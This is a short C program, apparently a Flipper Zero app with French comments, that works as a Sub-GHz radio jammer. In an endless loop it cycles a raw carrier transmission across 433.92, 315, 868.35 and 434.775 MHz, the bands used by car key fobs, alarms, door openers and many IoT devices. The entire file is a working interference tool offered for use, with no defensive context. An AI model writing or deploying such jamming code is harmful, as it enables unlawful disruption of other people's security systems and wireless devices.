#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_subghz.h>

// Liste des fréquences à saturer
uint32_t frequencies[] = {433920000, 315000000, 868350000, 434775000};

int32_t subghz_jammer_app(void* p) {
    UNUSED(p);

    // Initialisation du matériel et alimentation GPIO pour le CC1101
    furi_hal_power_enable_otg(); 
    furi_hal_subghz_reset();
    
    // On force la radio en mode IDLE (repos) pour accepter la configuration
    furi_hal_subghz_idle();

    FURI_LOG_I("JAMMER", "Brouillage en cours sur module externe...");

    while(1) {
        for(size_t i = 0; i < 4; i++) {
            // 1. On règle la fréquence
            furi_hal_subghz_set_frequency(frequencies[i]);

            // 2. On lance l'émission de la porteuse (Transmission brute)
            // Cette fonction ne demande aucun argument complexe
            furi_hal_subghz_tx(); 
            
            // On sature pendant 50ms
            furi_delay_ms(50); 
            
            // 3. On arrête l'émission et on remet la radio au repos
            furi_hal_subghz_idle();
            
            // Petit délai de saut (10ms)
            furi_delay_ms(10); 
        }
        
        // Petite pause de sécurité pour éviter la surchauffe
        furi_delay_ms(5);
    }

    // Jamais atteint
    furi_hal_power_disable_otg();
    return 0;
}
